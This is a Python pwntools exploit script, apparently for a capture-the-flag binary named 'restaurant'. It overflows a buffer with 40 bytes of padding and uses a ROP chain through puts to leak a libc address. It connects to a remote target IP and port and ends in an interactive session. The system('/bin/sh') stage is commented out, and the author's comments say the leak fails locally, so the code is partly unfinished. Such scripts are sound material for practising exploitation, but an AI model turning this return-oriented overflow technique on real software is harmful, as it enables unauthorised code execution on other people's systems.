#!/usr/bin/env python3

from pwn import p64,u64
from pwn import *

# NOTE XXX context binary is absolutly necessary when getting addresses from file
libc = ELF('./libc.so.6', checksec=False)
# Used pwnint to patch the binary and download the appropriate linker
exe = ELF("./restaurant_patched", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False) # use pwninit to
context.binary = exe

if args.REMOTE: # REMOTE=157.245.39.76:32334
	p = remote(args.REMOTE.split(':')[0],int(args.REMOTE.split(':')[1]))
else:
	p = exe.process()

# ========================================================================
# TODO this shit doesn't work locally, for that it needs printf instead of
#      puts and a ret addr after the padding to realign the stack...
def leak_libc():
	# get addresses ( use printf instead because puts just seems to not be able to print it)
	puts_got = exe.got['puts']	# readelf --relocs restaurant
	puts_plt = exe.plt['puts']	# objdump -D restaurant | fgrep puts
	rop = ROP(exe)
	pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	log.info(f'puts@plt@{hex(puts_plt)}  puts@got@{hex(puts_got)}')
	log.info(f'pop rd;ret; @{hex(pop_rdi)}')
	padding = cyclic_gen().get(40)
	payload = [
		padding,
		p64(pop_rdi),
		p64(puts_got),
		p64(puts_plt),
		p64(exe.symbols.fill) # leave program back at the fill function
	]
	p.sendlineafter(b'>', b'1') # input 1
	p.sendafter(b'>', flat(payload))
	p.recvuntil(padding)
	address_bytes = p.recv(6)
	print(address_bytes)
	return u64(address_bytes.ljust(8,b'\x00'))

# gdb.attach(p, 'b *fill+162') # break at end of fill function
address = leak_libc()
log.info(f'Found libc base addr: {hex(address)}')
print(hex(address))
# libc.address = address
#
# system = libc.sym.system
# bin_sh = next(libc.search(b"/bin/sh"))
# print('HERE >> ', hex(system), hex(bin_sh))

p.sendline(b'1')
p.interactive()
